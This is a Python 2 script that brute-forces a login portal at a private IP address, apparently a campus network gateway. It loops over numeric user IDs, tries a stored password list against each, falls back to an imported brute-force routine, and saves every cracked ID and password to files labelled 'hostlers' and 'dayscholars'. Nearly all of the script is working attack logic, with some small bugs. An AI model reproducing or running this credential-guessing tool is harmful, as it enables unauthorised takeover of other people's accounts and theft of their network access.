from sys import argv, exit
from brute import bruteforce
from sendrqst import send_request

BASE_URL = "http://172.16.68.6:8090/login.xml"


def pwds():
    data = open("pwd.dat","r").read()
    #file = open("pwd.dat","w")
    pwd = []
    for i in range(0,len(data)/7):
        s=""
        #print "Reading for print " ,i
        for j in range(6):
            s=s+data[i*7 + j]
        #file.write(s+"\n")
        pwd.append(s)
    #file.close()
    #print open("pwd.data","r").read()
    return pwd

def writInDaysFile(*args):
    file = open("dayscholars", "a")
    file.write(str(i) + " " + str(data1) + "\n")
    file.close()

def writInHostlersFile(*args):
    file = open("hostlers", "a")
    file.write(str(args[0]) + " " + str(args[1]) + "\n")
    file.close()


if __name__ == "__main__":
    pwd = pwds()
    print "got passwords"
    hostlerid = []
    hostlerpwd = []
    daysciid = []   
    dayscpwd = []
    total_req=0
    found=0
    found1=0
    ff = open("tillnow.dat","r")
    start = int(ff.read())
    ff.close()
    start+=1
    for i in range(argv[1],argv[2]):
        found = True
        for data1 in pwd:
            print "checking ",(str(i),data1)
            data = send_request('login',str(i),data1)
            if "Maximum" in data:
                print "found hostler id %s and pwd as %s",(str(i),data1)
                writInHostlersFile(str(i),str(data1))
                found+=1
                break
            elif "exceeded" in data:
                print "found hostler id %s and pwd as %s",(str(i),data1)
                writInHostlersFile(str(i),str(data1))
                found+=1
                break
            elif "into" in data:
                print "found hostler id %s and pwd as %s",(str(i),data1)
                writInHostlersFile(str(i),str(data1))
                found+=1
                break
            elif "allowed" in data:
                print "found daysci id %s and pwd as %s",(str(i),data1)
                writInDaysFile(str(i),str(data1))
                found+=1
                break
            else :
                found = False
        if found==False:
            file = open("no.dat","a")
            file.write(str(i) + "\n")
            file.close()
            resp=bruteforce(str(i))
            if resp != "NO":
                found+=1
                pwd.append(resp)
                file = open("pwd.dat","a")
                file.write(str(resp) + "\n")
                file.close()
                data = send_request('login',str(i),resp)
                if "allowed" in data:
                    print "found daysci id %s and pwd as %s",(str(i),resp)
                    writInDaysFile(str(i),str(resp))
                else :
                    print "found hostler id %s and pwd as %s",(str(i),resp)
                    writInHostlersFile(str(i),str(resp))
            else :
                file = open("no.dat","a")
                file.write(str(i) + "\n")
                file.close()

        print "total found ids = ",found
        ff = open("tillnow.dat","w")
        ff.write(str(i+1))
        ff.close()